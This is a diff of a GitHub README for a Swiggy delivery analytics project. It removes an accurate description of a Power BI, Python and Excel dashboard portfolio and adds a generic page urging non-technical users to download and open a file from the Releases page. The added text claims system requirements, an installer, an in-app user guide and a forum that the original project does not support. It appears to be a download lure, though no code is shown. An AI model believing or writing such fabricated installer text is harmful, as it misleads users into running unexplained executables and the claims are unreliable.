@@ -1,108 +1,94 @@
-# 🍽️ **Swiggy Delivery Performance Analytics**
+# 📈 Swiggy-Delivery-Performance-Analytics - Analyze Swiggy Delivery Performance Easily
 
-Food delivery platforms generate massive data every second — from customer orders to delivery times, traffic, weather, and profitability.
-This project analyzes Swiggy’s delivery performance to uncover insights into **operations efficiency, customer behavior, profitability, and real-world business patterns**.
-Using **Python, Excel, and interactive dashboards**, this project simulates analysis typically done inside food delivery companies.
+## 🚀 Getting Started
 
----
+Welcome to **Swiggy-Delivery-Performance-Analytics**! This application allows you to analyze Swiggy’s delivery performance, profitability, and operational efficiency. With simple tools and clear dashboards, you will gain valuable insights without needing any technical knowledge.
 
-## ❗ **Problem Statement**
+## 📥 Download Now
 
-Food-delivery businesses often struggle to understand the hidden factors behind delivery delays, profit loss, high cancellations, and fluctuating customer behavior.
-Without proper analytics, identifying patterns related to distance, traffic, weather, and discounts becomes difficult.
+[![Download Swiggy Delivery Performance Analytics](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/SubhradeepSeth/Swiggy-Delivery-Performance-Analytics/releases)
 
-This project solves that gap through structured analysis, modeling, and dashboarding to highlight the most important operational and financial insights.
+## 💻 System Requirements
 
----
+Before downloading the application, please ensure your system meets the following requirements:
 
-# 📊 **Swiggy Analytics Dashboard**
+- Operating System: Windows 10 or later, macOS 10.14 or later
+- Processor: 2 GHz or faster
+- RAM: 4 GB minimum
+- Storage: At least 500 MB of free space
+- Software: Python 3.6 or later, Microsoft Excel (if using Excel features)
 
-### **Executive Overview**
+## 📊 Features
 
-<img width="1301" height="728" alt="Executive Overview" src="https://github.com/user-attachments/assets/7726f02a-fbb9-4be2-916e-cb0f29e9b452" />
+The **Swiggy-Delivery-Performance-Analytics** application includes:
 
-### **Delivery Operations Efficiency**
+- **End-to-End Analysis**: Evaluate the entire delivery process for optimal performance.
+- **Profitability Insights**: Understand revenue versus costs to enhance business value.
+- **Interactive Dashboards**: Navigate easily through visual representations of data.
+- **Data Cleaning and Visualization**: Transform raw data into useful information.
+- **Excel Integration**: Import and analyze data directly within Excel.
 
-<img width="1302" height="727" alt="Delivery Operations" src="https://github.com/user-attachments/assets/cf88deb0-51d4-4eaa-b37f-f7cb7ff7e57f" />
+## 📥 Download & Install
 
-### **Customer Analytics & behaviour**
+To get started, [visit this page to download](https://github.com/SubhradeepSeth/Swiggy-Delivery-Performance-Analytics/releases) the latest version of the application. Follow these steps:
 
-<img width="1300" height="727" alt="Customer Analytics" src="https://github.com/user-attachments/assets/56b1a146-9e0b-445f-8f41-b84ae3f9e26e" />
+1. Click on the link above to open the Releases page.
+2. Look for the latest release.
+3. Find the downloadable file that suits your operating system.
+4. Click on it to start the download.
+5. Once the download is complete, locate the file on your computer.
+6. Open the file to begin the installation.
+7. Follow the on-screen instructions to complete the setup.
 
-### **Profitability & Finance**
+After installation, you will be ready to analyze your delivery performance.
 
-<img width="1297" height="728" alt="Profitability   Finance" src="https://github.com/user-attachments/assets/6a47d90d-7487-484a-9657-de25f43ea85a" />
+## 🔍 How to Use the Application
 
----
+1. **Open the Application**: Launch the program from your desktop or applications folder.
+2. **Import Data**: You can import your delivery data through the interface.
+3. **Select Analysis Parameters**: Choose the metrics you want to analyze.
+4. **View Dashboards**: Navigate through the dashboards for a visual overview of your data.
+5. **Export Reports**: Save your findings and share them with your team or stakeholders.
 
-## 📊 **Dashboard Development Data**
+## 📊 Understanding the Dashboards
 
-| Page    | Title                              | What It Shows                                                                                                                                                    |
-| ------- | ---------------------------------- | ---------------------------------------------------------------------------------------------------------------------------------------------------------------- |
-| **1️⃣** | **Executive Insights**             | • Total orders, delivered %, cancellation rate <br> • Revenue & average delivery time <br> • Demand trends and top-performing cities                             |
-| **2️⃣** | **Delivery Operations Efficiency** | • Traffic, weather, vehicle type & distance impact <br> • Delay reasons analysis <br> • Delivery time vs distance patterns                                       |
-| **3️⃣** | **Customer Analytics**             | • Customer age groups & spending behavior <br> • Cuisine preferences <br> • Payment method trends <br> • City-wise customer behavior                             |
-| **4️⃣** | **Profitability & Finance**        | • Revenue vs cost vs profit <br> • Discount impact & margin analysis <br> • Loss-making order identification <br> • Profit segmentation across cuisines & cities |
+The dashboards provide interactive elements that allow you to filter and explore data. You can click on different sections to drill down into specifics like delivery times, order values, and customer feedback. This feature helps you to identify patterns and trends effortlessly.
 
----
+## 📌 Support and Resources
 
-## 🧩 **Project Workflow**
+If you need help, check out the following resources:
 
-| Step                             | Task                         | Key Actions                                                                             |
-| -------------------------------- | ---------------------------- | --------------------------------------------------------------------------------------- |
-| **1️⃣ Data Collection**          | Import raw food delivery CSV | 45K+ Swiggy/Zomato-like records                                                         |
-| **2️⃣ Data Enrichment (Python)** | Add calculated features      | Delivery distance, cost, profit, discount %, final amount, customer age, cuisine, flags |
-| **3️⃣ Data Cleaning (Excel)**    | Validation & correction      | Missing values, outliers, formatting, consistency                                       |
-| **4️⃣ Data Modeling (BI)**       | Relationship building & DAX  | KPI measures, calculated columns, field grouping                                        |
-| **5️⃣ Dashboard Development**    | 3-page report                | Executive Insights, Delivery Operations, Profitability & Finance                        |
+- **User Guide**: A detailed user manual is available within the application.
+- **FAQs**: Frequently asked questions can help resolve common queries.
+- **Community Forum**: Join discussions with other users to share insights and tips.
 
----
+## 📖 Topics Covered
 
-## 📈 **Key Insights**
+This application includes a range of topics to assist with your analysis:
 
-| Insight                                                     | Explanation                                                                                                                                                         |
-| ----------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
-| **🚦 High traffic increases delivery time by ~25%**         | During peak hours and high-traffic zones, delivery riders take longer routes or face slowdowns, increasing total delivery time and reducing operational efficiency. |
-| **💸 Discounts above 20% sharply reduce profit margins**    | Heavy discounts directly cut into revenue, and after platform fees + delivery costs, orders often generate little to no profit when discount % exceeds 20%.         |
-| **🍽️ Snacks & Biryani are the most profitable categories** | These cuisines have high order frequency, low preparation time, and healthy margins—making them top contributors to overall profitability.                          |
-| **📍 Long-distance orders (> 6 km) often result in losses** | Higher fuel costs, longer delivery time, and increased rider payout make long-distance orders less profitable or even loss-making.                                  |
-| **🌆 Evening hours show the highest order volume**          | Customer ordering peaks between 7 PM–10 PM due to dinner demand, leading to increased order density and higher revenue during these hours.                          |
+- advanced-excel
+- business-insights
+- dashboard-analytic
+- data-analysis
+- data-cleaning-visualization
+- eda (exploratory data analysis)
+- food-delivery
+- powerbi
+- python
+- swiggy
 
----
+Utilizing these topics will enhance your understanding and usage of the software.
 
-## 🛠️ **Tech Stack Used**
+## 📥 Additional Downloads
 
-| Tool                              | Purpose                                                 |
-| --------------------------------- | ------------------------------------------------------- |
-| **Python (Pandas, NumPy)**        | Data enrichment, calculations, preprocessing            |
-| **Excel**                         | Data cleaning, consistency checks                       |
-| **Power BI (DAX + Dashboarding)** | Building visuals, KPIs, calculations, and relationships |
-| **GitHub**                        | Documentation & version control                         |
+If you require sample datasets to practice with the application or additional resources, you may also find links provided in the documentation.
 
----
+## 🔄 Feedback
 
-# 🧠 **Conclusion / Benefits**
+We value your input. If you encounter issues or have suggestions for improvements, please reach out through the GitHub issues page. Your feedback helps us improve the application for everyone.
 
-This project delivers a complete analytical view of Swiggy’s delivery ecosystem, helping different teams make smarter decisions:
+## 📝 License
 
-### 💡 **For Business Strategy**
+The **Swiggy-Delivery-Performance-Analytics** application is released under the MIT License. You may freely use, modify, and distribute this software while adhering to the associated license terms.
 
-* Identify profitable vs loss-making order segments
-* Understand discount thresholds affecting margin
-
-### 🚴 **For Delivery Operations**
-
-* Detect patterns causing delays: traffic, weather, distance
-* Optimize delivery time and fleet planning
-
-### 🧾 **For Finance Teams**
-
-* Evaluate profit vs cost across cuisines, cities, and order types
-* Spot financial leaks caused by distance or heavy discounts
-
-### 📊 **For Data Teams**
-
-* Learn an end-to-end analytics workflow from raw data → cleaning → analysis → dashboard
-* Demonstrate practical use of Python, Excel, and BI tools
-
-Overall, this project provides clear operational, financial, and strategic insights that can improve delivery performance, profitability, and customer satisfaction in real food-delivery businesses.
+Thank you for choosing **Swiggy-Delivery-Performance-Analytics**! Enjoy analyzing your delivery performance with ease.
